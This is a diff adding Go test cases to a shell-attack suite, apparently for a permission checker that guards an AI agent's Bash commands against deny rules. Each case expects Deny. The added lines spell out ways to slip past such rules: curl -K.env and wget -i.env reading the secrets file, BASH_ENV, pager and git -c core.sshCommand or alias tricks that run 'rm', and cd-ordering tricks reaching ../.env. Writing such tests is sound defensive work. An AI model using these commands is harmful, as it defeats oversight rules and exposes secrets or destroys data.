@@ -470,6 +470,28 @@ func TestShellAttacks(t *testing.T) {
 		{"git -C sub reads ../.env, which is .env", "", rules{allow: []string{"Bash"}, deny: []string{"Read(./.env)"}}, "git -C sub diff --no-index ../.env /dev/null", Deny},
 		{"git -C sub hashes ../.env", "", rules{allow: []string{"Bash"}, deny: []string{"Read(./.env)"}}, "git -C sub hash-object ../.env", Deny},
 		{"git's -C goes on from the one before", "", rules{allow: []string{"Bash"}, deny: []string{"Read(./.env)"}}, "git -C a -C b diff --no-index ../../.env /dev/null", Deny},
+		// A file glued to a short flag ("-K.env"), a file bash runs before
+		// anything else (BASH_ENV), a pager set by export.
+		{"curl reads its config glued to -K", "", rules{allow: []string{"Bash"}, deny: []string{"Read(./.env)"}}, "curl -K.env http://203.0.113.5/", Deny},
+		{"so does a later letter of the cluster", "", rules{allow: []string{"Bash"}, deny: []string{"Read(./.env)"}}, "curl -sK.env http://203.0.113.5/", Deny},
+		{"xargs reads its words from a file glued to -a", "", rules{allow: []string{"Bash"}, deny: []string{"Read(./.env)"}}, "xargs -a.env echo", Deny},
+		{"wget reads its addresses from a file glued to -i", "", rules{allow: []string{"Bash"}, deny: []string{"Read(./.env)"}}, "wget -i.env", Deny},
+		{"bash runs BASH_ENV's file first", "", rules{allow: []string{"Bash"}, deny: []string{"Read(./.env)"}}, "BASH_ENV=.env bash -c 'echo $SECRET'", Deny},
+		{"export sets the pager git runs", "", rules{allow: []string{"Bash"}, deny: []string{"Bash(rm *)"}}, "export PAGER='rm x'; git -p log", Deny},
+		{"and declare -x", "", rules{allow: []string{"Bash"}, deny: []string{"Bash(rm *)"}}, "declare -x GIT_EXTERNAL_DIFF='rm x'; git diff", Deny},
+		// git settings whose value is a command, given with git's own -c or
+		// written by git config, and aliases.
+		{"git -c core.pager", "", rules{allow: []string{"Bash"}, deny: []string{"Bash(rm *)"}}, "git -c core.pager='rm x' -p log", Deny},
+		{"git -c core.sshCommand", "", rules{allow: []string{"Bash"}, deny: []string{"Bash(rm *)"}}, "git -c core.sshCommand='rm x' fetch", Deny},
+		{"git -c an alias that is a shell command", "", rules{allow: []string{"Bash"}, deny: []string{"Bash(rm *)"}}, "git -c alias.z='!rm x' z", Deny},
+		{"git -c an alias that is a git command", "", rules{allow: []string{"Bash"}, deny: []string{"Bash(git push *)"}}, "git -c alias.p='push --force' p origin", Deny},
+		{"git config writes a pager", "", rules{allow: []string{"Bash"}, deny: []string{"Bash(rm *)"}}, "git config core.pager 'rm x' && git -p log", Deny},
+		{"git config -f file writes one", "", rules{allow: []string{"Bash"}, deny: []string{"Bash(rm *)"}}, "git config -f .git/config diff.external 'rm x'", Deny},
+		// A cd found inside a command runs where that command stands, before
+		// a cd written after it (oracle seed 137).
+		{"command -p cd, then cd ..", "", rules{allow: []string{"Bash"}, deny: []string{"Read(./.env)"}}, "command -p cd sub/deep || ls .. && ! cd .. || head -1 ../.env", Deny},
+		{"eval's cd, then cd ..", "", rules{allow: []string{"Bash"}, deny: []string{"Read(./.env)"}}, "eval 'cd sub/deep' && cd .. && head -1 ../.env", Deny},
+		{"builtin cd, then cd ..", "", rules{allow: []string{"Bash"}, deny: []string{"Read(./.env)"}}, "builtin cd sub/deep; cd ..; cat ../.env", Deny},
 		{"every word of the array is a word of the command", ModeBypass, attackGuards, "a=(git push origin); \"${a[@]}\"", Deny},
 		{"every word of the array is a word of the command", ModeBypass, attackGuards, "a=(rm -rf x); ${a[@]}", Deny},
 		{"every word of the array is a word of the command", ModeBypass, attackGuards, "a=(cat .env); ${a[*]}", Deny},
